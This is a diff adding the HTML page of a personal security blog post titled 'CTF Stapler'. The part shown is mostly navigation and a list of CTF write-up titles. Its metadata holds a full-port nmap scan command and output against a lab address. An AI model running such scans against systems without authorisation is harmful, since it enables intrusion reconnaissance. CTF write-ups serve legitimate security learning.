@@ -1,0 +1,1636 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF Stapler | Peanutstick</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="CTF Stapler | Peanutstick">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="nmapnmap -p- -T5 -sV -vvv 10.10.210.193 Output: PORT      STATE    SERVICE     REASON      VERSION 22&#x2F;tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF VulnNet Internal">
+<meta property="og:url" content="https://peanutstick.github.io/post/CTF%20VulnNet%20Internal.html">
+<meta property="og:site_name" content="Peanutstick">
+<meta property="og:description" content="nmapnmap -p- -T5 -sV -vvv 10.10.210.193 Output: PORT      STATE    SERVICE     REASON      VERSION 22&#x2F;tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/0ZlNChN.png">
+<meta property="og:image" content="https://i.imgur.com/ev9bL5y.png">
+<meta property="og:image" content="https://i.imgur.com/2bQkQaG.png">
+<meta property="og:image" content="https://i.imgur.com/wVLajsv.png">
+<meta property="og:image" content="https://i.imgur.com/9UkA58M.png">
+<meta property="og:image" content="https://i.imgur.com/PqBLArN.png">
+<meta property="og:image" content="https://i.imgur.com/aay4oot.png">
+<meta property="og:image" content="https://i.imgur.com/pDykvq7.png">
+<meta property="og:image" content="https://i.imgur.com/RRUzr5v.png">
+<meta property="og:image" content="https://i.imgur.com/i0OQxk7.png">
+<meta property="og:image" content="https://i.imgur.com/u1uiApo.png">
+<meta property="og:image" content="https://i.imgur.com/WFN0l8S.png">
+<meta property="og:image" content="https://i.imgur.com/93fLf8I.png">
+<meta property="og:image" content="https://i.imgur.com/t6n9yjj.png">
+<meta property="article:published_time" content="2023-04-25T15:21:16.510Z">
+<meta property="article:modified_time" content="2023-04-25T15:25:05.111Z">
+<meta property="article:author" content="Peanutstick">
+<meta property="article:tag" content="Pivot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/0ZlNChN.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Peanutstick</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/Peanutstick"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/benjy500c/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(97)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="CTF">
+                        
+                        CTF
+                        <small>(63)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="dev">
+                        
+                        dev
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Fix">
+                        
+                        Fix
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="OS">
+                        
+                        OS
+                        <small>(23)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Security">
+                        
+                        Security
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Tips">
+                        
+                        Tips
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="97">
+<input type="hidden" id="yelog_site_word_count" value="50k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
+            
+            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">Contents</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>api</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>arch</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Arch</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>bruteforce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Buffer overflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>cms</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CMS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CVE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>database</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ffmpeg</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>IRC</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lfi</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>LFI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pivot</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Pivot</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>privesc</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pwn</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rice</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Rice</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqli</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SSTI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>steganography</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>tor</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VPN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>webserver</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Windows</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Youtube</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All CTF "
+           href="/post/CTF%20VulnNet%20Internal.html"
+           data-tag="Pivot"
+           data-author="" >
+            <span class="post-title" title="CTF VulnNet Internal">CTF VulnNet Internal</span>
+            <span class="post-date" title="2023-04-25 17:21:16">2023/04/25</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Tokyo%20Ghoul.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Tokyo Ghoul">CTF Tokyo Ghoul</span>
+            <span class="post-date" title="2023-04-23 17:42:00">2023/04/23</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Flatline.html"
+           data-tag="Windows"
+           data-author="" >
+            <span class="post-title" title="CTF Flatline">CTF Flatline</span>
+            <span class="post-date" title="2023-04-21 13:42:00">2023/04/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Tech_Supp0rt%201.html"
+           data-tag="CMS"
+           data-author="" >
+            <span class="post-title" title="CTF Tech_Supp0rt 1">CTF Tech_Supp0rt 1</span>
+            <span class="post-date" title="2023-04-20 03:46:00">2023/04/20</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Olympus.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Olympus">CTF Olympus</span>
+            <span class="post-date" title="2023-04-19 03:46:00">2023/04/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Archangel.html"
+           data-tag="LFI"
+           data-author="" >
+            <span class="post-title" title="CTF Archangel">CTF Archangel</span>
+            <span class="post-date" title="2023-04-17 02:15:00">2023/04/17</span>
+        </a>
+        
+        <a  class="All "
+           href="/post/Keyboards.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Keyboars">Keyboars</span>
+            <span class="post-date" title="2023-04-16 02:15:00">2023/04/16</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Road.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Road">CTF Road</span>
+            <span class="post-date" title="2023-04-15 02:15:00">2023/04/15</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Mustacchio.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Mustacchio">CTF Mustacchio</span>
+            <span class="post-date" title="2023-04-14 02:15:00">2023/04/14</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20socker.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF socker">CTF socker</span>
+            <span class="post-date" title="2023-04-13 06:15:00">2023/04/13</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/CVE-2023-24055%20KeePass%202.5x.html"
+           data-tag="CVE"
+           data-author="" >
+            <span class="post-title" title="CVE-2023-24055 KeePass 2.5x">CVE-2023-24055 KeePass 2.5x</span>
+            <span class="post-date" title="2023-04-12 17:11:29">2023/04/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Year%20of%20the%20Rabbit.html"
+           data-tag="steganography"
+           data-author="" >
+            <span class="post-title" title="CTF Year of the Rabbit">CTF Year of the Rabbit</span>
+            <span class="post-date" title="2023-04-12 16:14:27">2023/04/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/sqlhell.html"
+           data-tag="sql"
+           data-author="" >
+            <span class="post-title" title="CTF sqlhell">CTF sqlhell</span>
+            <span class="post-date" title="2023-04-10 20:14:00">2023/04/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Inject.html"
+           data-tag="lfi"
+           data-author="" >
+            <span class="post-title" title="CTF inject">CTF inject</span>
+            <span class="post-date" title="2023-04-05 03:20:00">2023/04/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Stocker.html"
+           data-tag="lfi"
+           data-author="" >
+            <span class="post-title" title="CTF inject">CTF inject</span>
+            <span class="post-date" title="2023-04-05 03:20:00">2023/04/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Year%20of%20the%20Owl.html"
+           data-tag="Windows"
+           data-author="" >
+            <span class="post-title" title="CTF Year of the Owl">CTF Year of the Owl</span>
+            <span class="post-date" title="2023-03-25 10:15:00">2023/03/25</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Bugged.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Bugged">CTF Bugged</span>
+            <span class="post-date" title="2023-03-09 09:00:00">2023/03/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Intro%20To%20Pwntools.html"
+           data-tag="Buffer overflow"
+           data-author="" >
+            <span class="post-title" title="Intro To Pwntools">Intro To Pwntools</span>
+            <span class="post-date" title="2023-03-01 07:40:00">2023/03/01</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Buffer%20Overflow%20Prep%202.html"
+           data-tag="Buffer overflow"
+           data-author="" >
+            <span class="post-title" title="Buffer Overflow Prep 2">Buffer Overflow Prep 2</span>
+            <span class="post-date" title="2023-02-27 00:10:00">2023/02/27</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Buffer%20Overflow%20Prep%201.html"
+           data-tag="Buffer overflow"
+           data-author="" >
+            <span class="post-title" title="Buffer Overflow Prep 1">Buffer Overflow Prep 1</span>
+            <span class="post-date" title="2023-02-26 04:30:00">2023/02/26</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20BoilCTF.html"
+           data-tag="Buffer overflow"
+           data-author="" >
+            <span class="post-title" title="CTF BoilCTF">CTF BoilCTF</span>
+            <span class="post-date" title="2023-02-20 02:00:00">2023/02/20</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Wekor.html"
+           data-tag="sqli"
+           data-author="" >
+            <span class="post-title" title="CTF Wekor">CTF Wekor</span>
+            <span class="post-date" title="2023-02-19 11:57:00">2023/02/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Plotted-LMS.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Plotted-LMS">CTF Plotted-LMS</span>
+            <span class="post-date" title="2023-02-16 22:30:00">2023/02/16</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Install%20of%20kali%20on%20Arch%20with%20QEMU.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Install Kali with QEMU">Install Kali with QEMU</span>
+            <span class="post-date" title="2023-02-11 08:56:00">2023/02/11</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Wgel%20CTF.html"
+           data-tag="privesc"
+           data-author="" >
+            <span class="post-title" title="CTF Wgel CTF">CTF Wgel CTF</span>
+            <span class="post-date" title="2023-02-06 02:20:00">2023/02/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Ignite.html"
+           data-tag="CMS"
+           data-author="" >
+            <span class="post-title" title="CTF Ignite">CTF Ignite</span>
+            <span class="post-date" title="2023-01-30 01:20:00">2023/01/30</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Learn%20CTF%20on%20windows.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Learn CTF on windows">Learn CTF on windows</span>
+            <span class="post-date" title="2023-01-15 02:26:00">2023/01/15</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Relevant.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Relevant">CTF Relevant</span>
+            <span class="post-date" title="2023-01-13 18:18:00">2023/01/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Ted.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Ted">CTF Ted</span>
+            <span class="post-date" title="2023-01-13 18:18:00">2023/01/13</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Bypass%20yt%20restriction.html"
+           data-tag="Youtube"
+           data-author="" >
+            <span class="post-title" title="Bypass yt restriction">Bypass yt restriction</span>
+            <span class="post-date" title="2023-01-13 05:25:00">2023/01/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Daily%20Bugle.html"
+           data-tag="CMS"
+           data-author="" >
+            <span class="post-title" title="CTF Daily Bugle">CTF Daily Bugle</span>
+            <span class="post-date" title="2023-01-13 02:20:00">2023/01/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Internal.html"
+           data-tag="CMS"
+           data-author="" >
+            <span class="post-title" title="CTF Daily Bugle">CTF Daily Bugle</span>
+            <span class="post-date" title="2023-01-12 02:20:00">2023/01/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Mr%20Robot.html"
+           data-tag="CMS"
+           data-author="" >
+            <span class="post-title" title="CTF Mr Robot">CTF Mr Robot</span>
+            <span class="post-date" title="2023-01-09 09:51:00">2023/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20SecretRezip.html"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CTF SecretRezip">CTF SecretRezip</span>
+            <span class="post-date" title="2022-11-11 03:25:00">2022/11/11</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Hackfest%202016.html"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="CTF Hackfest 2016">CTF Hackfest 2016</span>
+            <span class="post-date" title="2022-10-27 04:21:00">2022/10/27</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Micro%20Storage.html"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
+            <span class="post-date" title="2022-10-17 06:25:00">2022/10/17</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Eternal%20Loop.html"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
+            <span class="post-date" title="2022-09-26 10:15:00">2022/09/26</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Fresh%20install%20of%20Arch.html"
+           data-tag="Arch"
+           data-author="" >
+            <span class="post-title" title="Fresh install of Arch">Fresh install of Arch</span>
+            <span class="post-date" title="2022-07-10 03:30:00">2022/07/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/DIGITALWORLD%20FALL.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="DIGITALWORLD: FALL ">DIGITALWORLD: FALL </span>
+            <span class="post-date" title="2022-07-03 06:30:52">2022/07/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Victim1.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Victim1">CTF Victim1</span>
+            <span class="post-date" title="2022-06-27 07:48:00">2022/06/27</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Silky%200x01.html"
+           data-tag="bruteforce"
+           data-author="" >
+            <span class="post-title" title="CTF Silky 0x01">CTF Silky 0x01</span>
+            <span class="post-date" title="2022-06-13 02:44:00">2022/06/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Beelzebub.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Beelzebub">CTF Beelzebub</span>
+            <span class="post-date" title="2022-06-10 03:29:00">2022/06/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Shibboleth.html"
+           data-tag="bruteforce"
+           data-author="" >
+            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
+            <span class="post-date" title="2022-03-13 07:29:00">2022/03/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20PwnLab.html"
+           data-tag="database"
+           data-author="" >
+            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
+            <span class="post-date" title="2022-03-06 11:07:00">2022/03/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20simple%20CTF.html"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
+            <span class="post-date" title="2022-03-03 01:20:00">2022/03/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20hacker%20kid.html"
+           data-tag="SSTI"
+           data-author="" >
+            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
+            <span class="post-date" title="2022-02-28 03:19:00">2022/02/28</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/How%20to%20gain%20some%20GiB%20on%20Arch%20Linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
+            <span class="post-date" title="2022-02-21 03:15:00">2022/02/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Jordaninfosec.html"
+           data-tag="privesc"
+           data-author="" >
+            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
+            <span class="post-date" title="2022-02-18 05:11:00">2022/02/18</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Deathnote.html"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
+            <span class="post-date" title="2022-02-08 09:20:00">2022/02/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Paper.html"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="CTF Paper">CTF Paper</span>
+            <span class="post-date" title="2022-02-06 11:07:00">2022/02/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Pandora.html"
+           data-tag="pivot"
+           data-author="" >
+            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
+            <span class="post-date" title="2022-02-05 08:30:00">2022/02/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Meta.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Meta">CTF Meta</span>
+            <span class="post-date" title="2022-02-02 10:15:00">2022/02/02</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Secret.html"
+           data-tag="api"
+           data-author="" >
+            <span class="post-title" title="CTF Secret">CTF Secret</span>
+            <span class="post-date" title="2022-01-31 07:29:00">2022/01/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Backdoor.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
+            <span class="post-date" title="2022-01-30 05:19:00">2022/01/30</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Horizontall.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
+            <span class="post-date" title="2022-01-24 03:42:00">2022/01/24</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Toppo.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
+            <span class="post-date" title="2022-01-23 00:54:00">2022/01/23</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Wallpaper%20selector%20with%20sxiv.html"
+           data-tag="Rice"
+           data-author="" >
+            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
+            <span class="post-date" title="2022-01-22 09:35:00">2022/01/22</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20cybersploit.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
+            <span class="post-date" title="2022-01-22 03:19:00">2022/01/22</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20unknowndevice64-1.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
+            <span class="post-date" title="2022-01-20 03:51:00">2022/01/20</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Record%20screen%20with%20ffmpeg.html"
+           data-tag="ffmpeg"
+           data-author="" >
+            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
+            <span class="post-date" title="2022-01-19 08:56:00">2022/01/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Stapler.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
+            <span class="post-date" title="2022-01-15 08:07:00">2022/01/15</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Create%20a%20polybar%20module.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
+            <span class="post-date" title="2022-01-13 06:09:00">2022/01/13</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Replacing%20xfce4%20bar%20by%20Polybar.html"
+           data-tag="rice"
+           data-author="" >
+            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
+            <span class="post-date" title="2022-01-12 07:57:00">2022/01/12</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Cut%20an%20online%20video%20with%20ffmpeg.html"
+           data-tag="ffmpeg"
+           data-author="" >
+            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
+            <span class="post-date" title="2022-01-11 10:15:00">2022/01/11</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Create%20a%20locale%20stream.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
+            <span class="post-date" title="2022-01-10 02:18:00">2022/01/10</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/CTF_SickOs.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
+            <span class="post-date" title="2022-01-09 08:15:00">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Dinae.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
+            <span class="post-date" title="2022-01-09 05:16:00">2022/01/09</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Switch%20from%20i3%20to%20bspwm.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
+            <span class="post-date" title="2022-01-01 08:37:00">2022/01/01</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix%20my%20spyware%20is%20stuck%20in%20the%20login%20loop%20(Microsoft%20teams).html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="my spyware is stuck in the login loop (Microsoft teams)">my spyware is stuck in the login loop (Microsoft teams)</span>
+            <span class="post-date" title="2021-12-28 04:15:00">2021/12/28</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20IMF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF IMF">CTF IMF</span>
+            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Tr0ll.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
+            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
+        </a>
+        
